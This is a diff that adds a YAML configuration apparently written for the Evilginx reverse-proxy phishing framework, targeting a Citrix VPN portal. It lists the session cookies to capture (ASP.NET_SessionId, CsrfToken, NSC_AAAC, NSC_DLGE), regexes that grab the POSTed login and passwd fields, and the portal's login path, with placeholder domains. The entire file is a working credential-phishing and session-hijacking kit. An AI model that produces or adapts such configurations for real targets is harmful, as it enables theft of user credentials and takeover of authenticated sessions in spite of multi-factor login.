@@ -1,0 +1,22 @@
+name: 'Citrix Portal'
+author: '@424f424f'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'subdomainhere', orig_sub: 'subdomainhere', domain: 'domainhere', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: 'domainhere', orig_sub: 'subdomainhere', domain: 'domainhere', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: 'domainhere'
+    keys: ['ASP.NET_SessionId','CsrfToken','NSC_AAAC','NSC_DLGE','pwcount']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'subdomainhere.domainhere'
+  path: '/vpn/index.html'
